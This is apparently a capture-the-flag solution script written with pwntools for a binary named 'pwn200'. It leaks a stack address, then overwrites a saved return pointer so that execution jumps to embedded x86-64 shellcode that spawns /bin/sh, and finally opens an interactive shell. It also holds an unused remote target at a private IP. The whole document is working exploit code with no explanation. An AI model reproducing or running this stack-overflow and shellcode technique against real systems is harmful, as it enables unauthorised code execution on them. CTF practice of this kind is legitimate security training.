from pwn import *
from ctypes import *


DEBUG = 1
if DEBUG:
     p = process('./pwn200')
else:
     r = remote('172.16.4.93', 13025)


main_ret=0

shellcode=""
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"


def pwn():
    #gdb.attach(p,"b *0x400A72")
    
    p.send('a'*46+'bb')
    p.recvuntil('bb')
    rbp_addr=p.recvuntil(', w')[:-3]
    rbp_addr=u64(rbp_addr.ljust(8,'\x00'))
    print hex(rbp_addr)

    main_ret=rbp_addr-0x78
    shellcode_addr=rbp_addr-0xb8
    p.send('3'+'\n')
    p.recvuntil('money~')
    data=p64(shellcode_addr)+shellcode
    data=data.ljust(0x38,'\x00')+p64(main_ret)
    p.send(data)
    p.recvuntil('choice : ')
    p.send('3'+'\n')

    p.interactive()


if __name__ == '__main__':
   pwn()
    

